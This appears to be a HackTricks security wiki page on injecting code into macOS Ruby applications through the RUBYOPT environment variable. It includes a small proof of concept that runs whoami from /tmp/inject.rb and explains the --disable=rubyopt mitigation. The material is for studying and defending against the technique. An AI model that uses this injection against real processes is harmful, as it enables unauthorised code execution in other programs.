# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby parses supported command-line switches from the `RUBYOPT` environment variable before running a script. Ruby rejects code execution through `-e` in `RUBYOPT`, but `-I` can prepend a library-search directory and `-r` can require a library. A process that launches Ruby with attacker-controlled environment variables can therefore be made to load attacker-controlled Ruby code.<sup>[[1]](#references)</sup>

Create `/tmp/inject.rb`:

```ruby:inject.rb
puts `whoami`
```

Create a benign Ruby script such as `hello.rb`:

```ruby:hello.rb
puts 'Hello, World!'
```

Run it with a controlled `RUBYOPT` value:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

To disable this behavior, pass `--disable=rubyopt` (or `--disable-rubyopt`) **before** the script name:<sup>[[1]](#references)</sup>

```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```

An option written after `hello.rb` is passed to the script in `ARGV`; it does not disable Ruby's earlier processing of `RUBYOPT`.<sup>[[1]](#references)</sup>

```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

## References

- [1] [Ruby documentation - Ruby command-line options](https://ruby-doc.org/3.4/ruby/options_md.html)

{{#include ../../../banners/hacktricks-training.md}}
